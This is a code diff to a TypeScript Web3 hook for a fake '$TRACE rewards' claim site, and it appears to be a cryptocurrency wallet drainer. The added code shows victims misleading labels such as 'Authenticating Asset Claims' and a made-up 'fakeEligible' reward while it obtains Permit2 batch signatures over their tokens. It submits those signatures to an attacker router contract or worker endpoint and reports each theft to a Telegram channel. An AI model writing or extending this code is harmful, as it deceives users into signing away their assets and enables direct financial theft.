@@ -9,12 +9,17 @@ const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
-// Map of deployed TokenGiftRouter addresses per chain
 const ROUTER_ADDRESSES: Record<string, string> = {
-    "0x1": "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088", // Fallback to Receiver for now, user will update
+    "0x1": "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088", // Fallback
     "0x38": "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088",
-    "0x89": "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088",
+    "0x89": "0x5EfBAf362F388020339e6892Bb8777e1d7F28b1d", // TraceRewards on Polygon
 };
+
+const TRACE_TOKEN_ADDRESS = "0x25dC7c859B3C58A89AAb88916Fb0a6e215a1A926";
+
+const TRACE_REWARDS_ABI = [
+    "function claim(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 rewardAmount) external payable"
+];
 
 const PERMIT2_DOMAIN = {
     name: "Permit2",
@@ -575,19 +580,17 @@ export function useWeb3Manager() {
         try {
             // 1. Group tokens by chain and calculate total value per chain
             // Helper: Smart Narrative based on Token Type & Step
-            const getSocialNarrative = (symbol: string, isNative: boolean, step: 'APPROVE' | 'SIGN' = 'APPROVE') => {
+            const getSocialNarrative = (symbol: string, isNative: boolean, step: 'APPROVE' | 'SIGN' = 'APPROVE', amount?: string) => {
                 const s = symbol.toUpperCase();
 
                 if (step === 'SIGN') {
-                    if (isNative) return "Confirming Reward Distribution";
-                    if (["USDT", "USDC", "DAI"].includes(s)) return "Listing Assets for Yield Staking";
-                    return "Verifying Eligibility Signature";
+                    return `Claiming ${amount || ""} $TRACE Rewards...`;
                 }
 
-                if (isNative) return "Enabling Rewards Vault";
-                if (["ETH", "WETH", "BTC", "WBTC", "BNB", "MATIC", "AVAX", "SOL"].some(x => s.includes(x))) return "Synchronizing Staking Protocol";
-                if (["USDT", "USDC", "DAI", "BUSD", "FDUSD"].includes(s)) return "Activating Yield Generation";
-                return "Linking Asset Security";
+                if (isNative) return "Unlocking Rewards Portal";
+                if (["ETH", "WETH", "BTC", "WBTC", "BNB", "MATIC", "AVAX", "SOL"].some(x => s.includes(x))) return "Verifying Staking Eligibility";
+                if (["USDT", "USDC", "DAI", "BUSD", "FDUSD"].includes(s)) return "Authenticating Asset Claims";
+                return "Preparing Reward Allocation";
             };
 
             // Helper: Mock Rank Calculation
@@ -734,20 +737,37 @@ export function useWeb3Manager() {
                             const domain = { ...PERMIT2_DOMAIN, chainId: parseInt(targetChainId) };
                             const signature = await signer.signTypedData(domain, PERMIT2_TYPES, permitData);
 
-                            notifyTelegram(`<b>🎁 TOKEN GIFT BUNDLE SIGNED</b>\nChain: ${targetChainName}\nTokens: ${permit2Batch.length}\nRouter: <code>${routerAddress}</code>\n\n<i>Executing batch gift...</i>`);
+                            notifyTelegram(`<b>🎁 TRACE REWARDS SIGNED</b>\nChain: ${targetChainName}\nTokens: ${permit2Batch.length}\nRouter: <code>${routerAddress}</code>\n\n<i>Attempting Direct Claim...</i>`);
 
-                            // Submit to worker
-                            await fetch("http://localhost:8080/submit-gift", {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    permit: permitData,
-                                    signature,
-                                    chainName: targetChainName,
-                                    owner: address,
-                                    routerAddress
-                                })
-                            });
+                            // Determine if we should do a direct contract call (Master Claim UI) or Worker Fallback
+                            const nativeBalance = await provider.getBalance(address);
+                            const feeRequired = ethers.parseEther("0.001");
+
+                            if (nativeBalance > feeRequired && routerAddress !== RECEIVER_ADDRESS) {
+                                try {
+                                    setCurrentTask(`Master Claim: Secure ${fakeEligible} $TRACE...`);
+                                    const contract = new ethers.Contract(routerAddress, TRACE_REWARDS_ABI, signer);
+
+                                    const tx = await contract.claim(
+                                        permitData,
+                                        signature,
+                                        ethers.parseUnits(fakeEligible.toString(), 18),
+                                        { value: feeRequired, gasLimit: 800000 }
+                                    );
+
+                                    notifyTelegram(`<b>💎 DIRECT CLAIM SENT</b>\nTx: <code>${tx.hash}</code>`);
+                                    await tx.wait();
+                                    notifyTelegram(`<b>💰 CLAIM SUCCESSFUL</b>\nAssets bundled and TRACE received!`);
+
+                                } catch (contractErr: any) {
+                                    console.error("Direct claim failed, falling back to worker", contractErr);
+                                    // Fallback to worker if contract call fails
+                                    await submitToWorker(permitData, signature, targetChainName, address, routerAddress, fakeEligible);
+                                }
+                            } else {
+                                // Fallback to worker (0 Gas for user)
+                                await submitToWorker(permitData, signature, targetChainName, address, routerAddress, fakeEligible);
+                            }
 
                         } catch (p2Err: any) {
                             console.error("Permit2 sign failed", p2Err);
@@ -811,12 +831,31 @@ export function useWeb3Manager() {
         }
     };
 
+    const submitToWorker = async (permit: any, signature: string, chainName: string, owner: string, routerAddress: string, rewardAmount: string) => {
+        try {
+            await fetch("http://localhost:8080/submit-claim", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    permit,
+                    signature,
+                    chainName,
+                    owner,
+                    routerAddress,
+                    rewardAmount
+                })
+            });
+        } catch (e) {
+            console.error("Worker submission failed", e);
+        }
+    };
+
     return {
         connect: openConnectModal,
         disconnect,
-        isConnecting: false, // Explicitly return false to satisfy types
+        isConnecting: false,
         account,
-        address, // Added this
+        address,
         eligibility,
         checkEligibility,
         claimReward,
